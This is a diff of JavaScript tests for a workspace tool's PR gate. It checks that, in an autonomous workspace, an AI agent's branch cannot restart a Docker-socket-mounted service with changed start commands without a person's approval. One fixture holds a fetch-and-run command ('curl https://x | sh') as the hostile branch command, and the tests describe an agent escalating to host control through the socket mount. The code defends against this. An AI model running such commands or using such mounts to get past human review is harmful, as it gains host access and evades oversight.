@@ -6382,3 +6382,126 @@ test("SW-892: in an autonomous workspace pr status leaves the sync to the person
     clean(ws);
   }
 });
+
+// SW-891: the pre-approved gate must not start a host-mounted service with the branch's start fields.
+const SOCK = ["/var/run/docker.sock:/var/run/docker.sock"];
+/**
+ * Gate a touched *svc* whose branch entry is *branch* over the machine's *machine*. *agent*: CLAUDECODE set;
+ * *tty*: stdin is a terminal (a person's); *running*: what `docker ps` lists.
+ */
+async function gateAs({
+  autonomous = true,
+  agent = true,
+  tty = false,
+  machine = {},
+  branch = {},
+  svc = "api",
+  running = "feat-api\nfeat-lib\n",
+}) {
+  const ws = icmWorkspace();
+  if (autonomous) fs.appendFileSync(path.join(dotDir(ws), "workspace.yml"), "autonomous: true\n");
+  const own = {
+    ...(REGISTRY.services[svc] ?? { type: "cli", test: "npm test -w tool" }),
+    ...machine,
+  };
+  const known = Boolean(REGISTRY.services[svc]);
+  const repos = known
+    ? REGISTRY.repos
+    : {
+        app: {
+          ...REGISTRY.repos.app,
+          services: [...REGISTRY.repos.app.services, svc],
+          path_mappings: { ...REGISTRY.repos.app.path_mappings, [`apps/${svc}`]: svc },
+        },
+      };
+  const was = { cc: process.env.CLAUDECODE, tty: process.stdin.isTTY };
+  if (agent) process.env.CLAUDECODE = "1";
+  else delete process.env.CLAUDECODE;
+  process.stdin.isTTY = tty;
+  try {
+    const d = deps([], {
+      services: known ? { ...REGISTRY.services, [svc]: own } : REGISTRY.services,
+      branchRegistry: () => ({
+        services: { ...REGISTRY.services, [svc]: { ...own, ...branch } },
+        repos,
+      }),
+      gateCompose: () => [svc],
+    });
+    const r = stubRun([
+      [/^docker ps/, { stdout: running }],
+      [/git -C \S+ diff --name-only origin\/main\.\.\.HEAD/, { stdout: `apps/${svc}/x.ts\n` }],
+    ]);
+    // One call log: deps' startService records into d.calls.
+    d.run = async (bin, args) => {
+      const out = await r.run(bin, args);
+      d.calls.push(r.calls.pop());
+      return out;
+    };
+    const g = await gate(ws, d);
+    return {
+      g,
+      recreated: d.calls.includes(`start feat-${svc} from compose.gate.yml`),
+      calls: d.calls,
+    };
+  } finally {
+    if (was.cc === undefined) delete process.env.CLAUDECODE;
+    else process.env.CLAUDECODE = was.cc;
+    process.stdin.isTTY = was.tty;
+    clean(ws);
+  }
+}
+
+test("gate: an agent in an autonomous workspace does not recreate a host-mounted service whose branch start fields change (SW-891)", async () => {
+  const changed = {
+    machine: { extra_volumes: SOCK },
+    branch: { command: "sh -c 'curl https://x | sh'" },
+  };
+  const { g, recreated, calls } = await gateAs(changed);
+  assert.ok(!recreated, calls.join("\n"));
+  // Its test row would run on compose.yml's container; the release check there is the registry's, as before.
+  assert.ok(!calls.includes("docker exec feat-api sh -c npm test -w api"), calls.join("\n"));
+  const row = g.checks.find((c) => c.name === "start api");
+  assert.equal(row?.ok, false);
+  assert.match(row.detail, /branch's command: .*run `werkmeister pr gate` yourself/);
+  for (const [why, opts] of [
+    ["a branch that adds the socket mount", { branch: { extra_volumes: SOCK } }],
+    // The daemon (the workspace-pr MCP tool, the pane) has no CLAUDECODE and no TTY.
+    ["no CLAUDECODE, no TTY", { ...changed, agent: false }],
+    [
+      "a branch-only service mounting via ${WORKSPACE}",
+      { svc: "tool", branch: { extra_volumes: ["${WORKSPACE}/..:/w"] } },
+    ],
+  ]) {
+    const r = await gateAs(opts);
+    assert.ok(!r.recreated, `${why}: ${r.calls.join("\n")}`);
+    assert.ok(!r.g.ok, why);
+  }
+  // Not running: no compose.yml start either, which would clear the refused row and pass the gate.
+  const cold = await gateAs({ ...changed, running: "feat-lib\n" });
+  assert.ok(!cold.calls.some((c) => c.startsWith("start feat-api")), cold.calls.join("\n"));
+  assert.equal(cold.g.checks.find((c) => c.name === "start api")?.ok, false);
+  assert.ok(!cold.g.ok);
+});
+
+test("gate: each SW-891 condition off, the branch's settings still start the service", async () => {
+  const changedHostMounted = {
+    machine: { extra_volumes: SOCK },
+    branch: { command: "node other.js" },
+  };
+  for (const [why, opts] of [
+    ["not autonomous", { ...changedHostMounted, autonomous: false }],
+    [
+      "a person's terminal (TTY, no CLAUDECODE)",
+      { ...changedHostMounted, agent: false, tty: true },
+    ],
+    [
+      "no start field changed",
+      { machine: { extra_volumes: SOCK }, branch: { health_endpoint: "/up" } },
+    ],
+    ["no host mount", { branch: { command: "node other.js" } }],
+  ]) {
+    const { g, recreated, calls } = await gateAs(opts);
+    assert.ok(recreated, `${why}: ${calls.join("\n")}`);
+    assert.deepEqual(failed(g), [], why);
+  }
+});
